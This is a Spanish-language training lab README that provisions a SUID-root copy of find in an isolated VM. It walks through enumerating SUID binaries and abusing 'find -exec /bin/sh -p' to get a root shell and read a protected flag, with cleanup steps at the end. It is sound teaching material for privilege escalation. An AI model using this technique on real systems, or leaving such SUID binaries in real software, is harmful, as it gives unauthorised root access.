# Laboratorio: binario SUID inseguro

[Inicio](../../../README.md) | [Privilege Escalation](../../README.md) | [Capítulo 04](../README.md)

> [!CAUTION]
> `setup.sh` copia `/usr/bin/find` a `/usr/local/bin/sysfind` con el bit SUID de `root` y crea un flag legible solo por `root`. Ejecuta este laboratorio únicamente en una VM Ubuntu aislada, con red host-only y una instantánea limpia previa. No lo apliques a sistemas compartidos ni de producción.

## Alcance

Provisionar un binario SUID de `root` a partir de una utilidad legítima, enumerarlo desde una cuenta sin privilegios, confirmar que se ejecuta como `root` y utilizarlo para leer un archivo protegido. El laboratorio reproduce de forma controlada la superficie de escalada descrita en el capítulo y refuerza la diferencia entre el UID real del usuario y el UID efectivo del proceso.

## Requisitos

- VM Ubuntu Server 22.04 LTS o superior, aislada (red host-only).
- Cuenta con privilegios de `sudo` para ejecutar la preparación.
- Utilidades presentes en la base del sistema: `find`, `bash`, `ls`, `id`, `stat`, `cat`.
- Instantánea limpia creada antes de empezar.

## Preparación

Desde la raíz de este laboratorio, ejecuta el aprovisionamiento como `root`:

```bash
sudo bash setup.sh
```

El script es idempotente: crea el usuario `student` si no existe, instala `/usr/local/bin/sysfind` con propietario `root:root` y permisos `4755`, y escribe el flag en `/root/flag.txt` con permisos `0600`. Al terminar imprime un resumen con el estado de cada elemento.

## Pasos

1. **Adoptar el contexto del usuario sin privilegios.** La cuenta `student` usa la contraseña de laboratorio `student`. Abre una sesión con:

   ```bash
   su - student
   ```

   Si ya dispones de una cuenta sin privilegios en la VM, úsala en lugar de `student`.

2. **Confirmar que no eres `root`.** Verifica la identidad actual:

   ```bash
   id
   ```

   Resultado esperado: un UID distinto de `0` (por ejemplo `uid=1001(student)`).

3. **Enumerar los binarios SUID del sistema.** Recorre el sistema sin salir del montaje principal:

   ```bash
   find / -xdev -perm -4000 -type f -ls 2>/dev/null
   ```

   Localiza en la salida el binario `/usr/local/bin/sysfind`, que no forma parte de los binarios SUID habituales de la distribución.

4. **Inspeccionar el binario sospechoso.** Comprueba propietario y permisos:

   ```bash
   ls -l /usr/local/bin/sysfind
   stat -c '%A %U:%G %n' /usr/local/bin/sysfind
   ```

   Resultado esperado: propietario `root`, grupo `root` y la `s` en la posición de ejecución del propietario (`-rwsr-xr-x`).

5. **Razonar por qué es abusable.** `sysfind` es una copia de `find` con SUID de `root`. Su opción `-exec` permite lanzar un comando por cada archivo encontrado y no reinicia los privilegios antes de hacerlo. Por tanto, el comando lanzado se ejecuta con el UID efectivo de `root`. La shell `/bin/sh` abandona los privilegios cuando EUID y RUID difieren, salvo que se invoque con `-p`, que fuerza el modo privilegiado.

6. **Lanzar una shell con privilegios elevados.** Ejecuta sobre el primer resultado y cierra la búsqueda con `-quit`:

   ```bash
   /usr/local/bin/sysfind . -exec /bin/sh -p \; -quit
   ```

   Si todo es correcto, obtendrás un nuevo prompt de shell.

7. **Confirmar la elevación.** Dentro de la shell, comprueba la identidad efectiva:

   ```bash
   id
   ```

   Resultado esperado: `uid=0(root) gid=0(root) groups=0(root)`.

8. **Acceder al recurso protegido.** Lee el flag, que solo `root` puede leer:

   ```bash
   cat /root/flag.txt
   ```

   Anota el valor devuelto como evidencia. Sale de la shell con `exit`.

## Resultados esperados

- El usuario sin privilegios no puede leer `/root/flag.txt` antes de la escalada.
- La enumeración revela `/usr/local/bin/sysfind` como SUID de `root`.
- El comando lanzado mediante `-exec` con `/bin/sh -p` devuelve `uid=0(root)`.
- El contenido de `/root/flag.txt` se muestra sin errores de permisos.

Evidencia mínima de éxito:

```text
uid=0(root) gid=0(root) groups=0(root)
PURPESEC{suid_root_escalation_lab_2026}
```

## Validación

Se consideran señales técnicas de éxito:

```text
[ ] setup.sh finaliza sin errores y muestra el resumen
[ ] /usr/local/bin/sysfind es root:root con permiso 4755
[ ] Antes de la escalada, cat /root/flag.txt falla con "Permission denied"
[ ] /usr/local/bin/sysfind . -exec /bin/sh -p \; -quit abre una shell
[ ] id dentro de la shell reporta uid=0(root)
[ ] cat /root/flag.txt devuelve el valor del laboratorio
```

## Limpieza

Elimina los artefactos creados y restaura el estado original:

```bash
sudo rm -f /usr/local/bin/sysfind /root/flag.txt
```

La opción recomendada es revertir la instantánea limpia de la VM, que elimina también al usuario `student` y cualquier cambio residual. Comprueba que el binario ya no existe:

```bash
ls -l /usr/local/bin/sysfind 2>/dev/null || echo "sysfind eliminado"
```

---

[Volver al capítulo 04](../README.md) | [Volver a Privilege Escalation](../../README.md) | [Inicio](../../../README.md)
